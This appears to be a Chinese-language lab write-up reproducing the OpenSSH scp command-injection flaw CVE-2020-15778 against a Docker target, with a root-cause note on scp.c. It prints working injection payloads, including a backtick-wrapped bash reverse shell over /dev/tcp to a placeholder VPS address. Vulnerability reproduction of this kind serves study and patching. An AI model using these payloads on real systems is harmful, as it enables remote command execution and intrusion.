# OpenSSH 命令注入漏洞（CVE-2020-15778）
## 简介
OpenSSH（OpenBSD Secure Shell）是OpenBSD计划组的一套用于安全访问远程计算机的连接工具。该工具是SSH协议的开源实现，支持对所有的传输进行加密，可有效阻止窃听、连接劫持以及其他网络级的攻击。

OpenSSH 8.3p1及之前版本中的scp的scp.c文件存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。

## 影响范围
```
产品：Openssh
影响的组件：SCP
漏洞版本：openssh<= openssh-8.3p1
```

## 漏洞环境

## 漏洞复现
docker作为漏洞环境，本机作为攻击机。
从攻击机使用scp拷贝文件到docker，正常是只拷贝文件
```
#使用scp命令将test传送至受害机的tmp文件夹下
scp test root@10.10.xx.xx:/tmp/test.txt
#之后需要输入受害机的密码，输入完成后，文件即传送过去了
```
漏洞点是可以在拷贝文件的同时，进行命令注入：
```
#在攻击机上通过特殊符号 ` 进行远程命令注入攻击
scp -P 20022 test root@127.0.0.1:'`touch /tmp/flag.sh`/tmp/test'
```
![](media/16328846646584/16328862895841.jpg)
受害机docker中，发现**命令执行**，且文件传输过来。
![](media/16328846646584/16328960055170.jpg)

使用该方式反弹shell：
```
scp -P 20022 test root@127.0.0.1:'`bash -i &>/dev/tcp/xx.vps.ip.xx/8899 <&1`/tmp/test'
```
![](media/16328846646584/16328963953426.jpg)

![](media/16328846646584/16328963738921.jpg)
复现完成。该漏洞稍微**有点鸡肋**，需要知道ssh的账户密码，因此只能在在特定环境下使用，如**虽然知道ssh账户密码，但是通常的ssh连接被阻止了。** 这个时候我们就可以利用这个漏洞进行连接。

## 漏洞原理
在上述过程中，scp会使用”-t“参数来获取存储传入文件的路径，如下：
```
scp Filename user@host:directory/Filename
```
在上述过程中，scp会使用”-t“参数来获取存储传入文件的路径，如下：
```
scp -t directory/Filename
```
![](media/16328846646584/16329071439864.jpg)
问题就出在这个地方，也就是"scp.c"文件的991行，如图。这个地方未对传入的文件路径进行检测防护。攻击者可以使用反引号包裹payload然后加上文件名执行scp命令，这时，payload将会发送到远程服务器并执行。



## 参考链接
* [CVE-2020-15778漏洞复现](https://www.jianshu.com/p/2a0ea4fec92a)